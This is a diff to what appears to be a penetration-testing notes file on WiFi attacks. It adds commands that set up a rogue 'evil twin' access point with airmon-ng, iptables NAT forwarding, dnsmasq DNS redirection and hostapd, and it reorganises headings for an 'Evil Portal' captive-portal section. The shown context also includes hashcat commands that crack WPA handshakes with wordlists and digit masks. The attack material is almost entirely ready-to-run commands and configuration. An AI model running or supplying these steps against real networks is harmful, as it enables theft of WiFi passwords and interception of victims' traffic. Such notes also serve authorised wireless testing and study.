@@ -8,7 +8,20 @@ Eg. sudo hashcat -a 0 -w 3 -m 22000 crackme.txt rockyou.txt
 Eg. sudo hashcat -a 0 -w 3 -m 22000 crackme.txt ?d?d?d?d?d?d?d?d
 ```
 
-### Evil Portal
+## Setup AP
+
+See IP-Tables.sh, hostapd.conf, and dnsmasq.conf below.&#x20;
+
+```
+sudo airmon-ng check kill
+sudo ifconfig (interface) up 10.0.0.1 netmask 255.255.255.0
+sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+sudo IP-Tables.sh
+sudo dnsmasq -C EvilTwin/dnsmasq.conf
+sudo hostapd EvilTwin/hostapd.conf -B
+```
+
+## Evil Portal
 
 ```
 sudo airmon-ng check kill
@@ -20,7 +33,7 @@ sudo dnsmasq -C EvilTwin/dnsmasq.conf
 sudo hostapd EvilTwin/hostapd.conf -B
 ```
 
-**IP-Tables.sh:**
+### **IP-Tables.sh:**
 
 ```
 sudo iptables --flush
@@ -30,7 +43,7 @@ sudo iptables -t nat -A POSTROUTING -j MASQUERADE
 sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
-**dnsmasq.conf:**
+### **dnsmasq.conf:**
 
 ```
 # Set the wifi interface
@@ -61,7 +74,7 @@ log-dhcp
 #address=/google.com/www.google.com.com/10.0.0.1
 ```
 
-**hostapd.conf:**
+### **hostapd.conf:**
 
 ```
 interface=(interface)
